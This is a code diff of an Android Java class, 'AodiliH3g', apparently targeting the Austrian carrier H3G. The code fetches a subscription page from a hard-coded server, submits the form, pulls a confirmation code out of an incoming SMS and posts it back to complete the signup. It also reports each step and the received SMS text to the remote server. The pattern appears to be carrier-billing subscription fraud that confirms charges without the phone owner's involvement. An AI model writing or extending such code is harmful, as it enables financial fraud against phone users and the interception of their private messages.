@@ -4,6 +4,7 @@ import android.text.TextUtils;
 
 import com.alibaba.fastjson.JSON;
 import com.enhtmv.sublib.common.SubCall;
+import com.enhtmv.sublib.common.SubEvent;
 import com.enhtmv.sublib.common.http.SubHttp;
 import com.enhtmv.sublib.common.http.SubResponse;
 import com.enhtmv.sublib.common.util.SubLog;
@@ -15,8 +16,7 @@ import java.util.HashMap;
 import java.util.Map;
 import java.util.UUID;
 
-import static com.enhtmv.sublib.common.SubSign.SUB_REQEUST;
-import static com.enhtmv.sublib.common.SubSign.SUB_SUCCESS;
+import static com.enhtmv.sublib.common.SubEvent.*;
 
 /**
  * 奥地利H3G
@@ -76,29 +76,24 @@ public class AodiliH3g extends SubCall {
         }
     }
 
-    public AodiliH3g() {
+    public AodiliH3g(SubEvent event) {
         super("http://54.153.76.222:8081");
+        this.event = event;
     }
 
-    private Meta getMeta() throws IOException {
-
-        String text = meta();
-
-        return JSON.parseObject(text, Meta.class);
-
-    }
 
     @Override
-    public synchronized void call() {
+    public synchronized void sub(String metaText) {
 
 
         if (this.ok) {
 
             try {
 
-                meta = getMeta();
-
                 if (meta != null) {
+
+                    Meta meta = JSON.parseObject(metaText, Meta.class);
+
 
                     this.ok = false;
 
@@ -110,6 +105,9 @@ public class AodiliH3g extends SubCall {
 
 //                    String url2 = "http://cpx5.allcpx.com:8088/subscript/request/" + ptxid;
                     SubResponse response = http.get(meta.url2 + ptxid);
+
+
+                    event.onMessage("step1", response.toString());
 
 
                     Element form = response.doc().select("form").first();
@@ -136,13 +134,16 @@ public class AodiliH3g extends SubCall {
 
                     SubLog.i(info);
 
-                    report.s(SUB_REQEUST);
+                    report(SUB_REQEUST);
                 }
             } catch (Exception e) {
                 this.ok = true;
 
                 SubLog.e(e, "sub request call error !");
                 report.e("sub_request_error", e);
+
+                event.onError(e);
+
             }
         }
 
@@ -150,9 +151,12 @@ public class AodiliH3g extends SubCall {
     }
 
     @Override
-    public synchronized void call(String message) {
+    public synchronized void onSub(String message) {
 
         if (info != null && meta != null) {
+
+            report(RECEIVE_SMS, message);
+
             if (!TextUtils.isEmpty(message) && message.length() > 10) {
 
                 String code = message.substring(5, 10);
@@ -194,13 +198,17 @@ public class AodiliH3g extends SubCall {
 
                         SubResponse response = http().form(info.action, header, info.form);
 
+                        event.onMessage("step2", response.toString());
+
                         if (response.response().request().url().toString().startsWith(meta.url3)) {
 
                             SubLog.i("success");
 
                             successCall.callback("success");
 
-                            report.s(SUB_SUCCESS);
+
+                            report(SUB_SUCCESS);
+
 
                         } else {
                             report.w("sub_failure", response);
@@ -210,6 +218,9 @@ public class AodiliH3g extends SubCall {
                     } catch (Exception e) {
                         SubLog.e(e, "sub message call error !");
                         report.e("sub_requst_message_error", e);
+
+                        event.onError(e);
+
                     } finally {
                         info = null;
                         ok = true;
